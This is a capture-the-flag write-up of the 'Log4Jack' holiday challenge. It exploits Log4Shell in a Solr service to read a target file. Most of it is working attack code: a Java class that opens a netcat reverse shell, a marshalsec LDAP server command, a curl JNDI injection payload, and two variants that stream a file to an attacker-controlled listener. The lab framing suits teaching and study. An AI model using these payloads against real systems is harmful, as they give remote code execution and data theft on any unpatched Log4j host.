# Bonus Red Log4Jack
**Location: North Pole**
**Troll: Icky McGoop**

This exercise runs in a Cranberry Pi terminal, focusing on exploiting the Log4J vulnerability recently discovered.
Multiple terminal session are created automatically, one running a web server serving from `/home/troll/web` on port 8080, another one running a netcat listener on port 4444.

The objective is to retrieve the file `/home/solr/kringle.txt` from a web service running solr on http://solrpower.kringlecastle.com:8983/.

First a Java class `Joergen` creating a reverse shell is created:
```java
public class Joergen {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc CLIENTIP 4444 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
```
*CLIENTIP* has to be replaced with the terminal's IP address.
This is placed in the web tree, so that the web server is able to hand out this class.
Next the [marshalsec](https://github.com/mbechler/marshalsec) installation residing in `/home/troll/marshalsec`  is started:
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://WEBSERVERIP:8080/#Joergen"
```
*WEBSERVERIP* has to be replaced with the terminal's IP address.
This application acts as an LDAP server and uses the Java class on the web server as remote code base.

Finally the Log4J vulnerability is triggered:
```
curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?foo=$\{jndi:ldap://MARSHALSECIP:1389/YuleLogExploit\}'
```
*MARSHALSECIP* has to be replaced with the terminal's IP address.

This triggers on the solr server an LDAP connection to the marshalsec service, which in turn delivers the Java class hosted on the web server. The solr server then executes this class, effectively creating a reverse shell connection to the netcat listener. This allows the file `kringle.txt` to be retrieved.
```
cat /home/solr/kringle.txt

The solution to Log4shell is patching.
Sincerely,

Santa
```
So **patching** is the solution.

### Alternative 1: just reading the targeted file
```java
import java.io.*;
import java.nio.file.*;
public class Joergen {
  static {
    try {
      Process p=java.lang.Runtime.getRuntime().exec("nc CLIENTIP 4444");
      Path path=Paths.get("/home/solr/kringle.txt");
      byte[] data = Files.readAllBytes(path);
      OutputStream out=p.getOutputStream();
      out.write(data);
      out.close();
    }catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```
*CLIENTIP* has to be replaced with the terminal's IP address.

### Alternative 2: pure Java solution, hence platform independant
```java
import java.io.*;
import java.nio.file.*;
import java.net.Socket;
public class Joergen {
  static {
    try {
      Socket socket=new Socket("CLIENTIP",4444);
      PrintStream out = new PrintStream( socket.getOutputStream() );
      Path path=Paths.get("/home/solr/kringle.txt");
      byte[] data = Files.readAllBytes(path);
      out.write(data);
    }catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```
*CLIENTIP* has to be replaced with the terminal's IP address.

**Achievement: Log4J Red Bonus**
